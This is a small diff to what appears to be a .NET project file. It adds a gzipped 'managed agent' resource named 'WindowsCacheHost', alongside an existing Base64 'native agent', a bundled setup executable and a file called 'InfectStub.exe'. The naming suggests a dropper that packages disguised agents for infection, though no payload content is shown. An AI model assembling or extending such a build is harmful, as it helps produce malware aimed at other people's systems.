@@ -29,6 +29,7 @@
 	</ItemGroup>
 
 	<ItemGroup>
+		<EmbeddedResource Include="Resources\KliveLink\WindowsCacheHostManaged.gz" LogicalName="KliveLink.ManagedAgent.Gzip" />
 		<EmbeddedResource Include="Resources\KliveLink\WindowsCacheHostNative.b64" LogicalName="KliveLink.NativeAgent.Base64" />
 		<EmbeddedResource Include="Resources\KliveLink\BundledSetup.exe" LogicalName="KliveLink.BundledSetup" />
 		<EmbeddedResource Include="Resources\KliveLink\InfectStub.exe" LogicalName="KliveLink.InfectStub" />
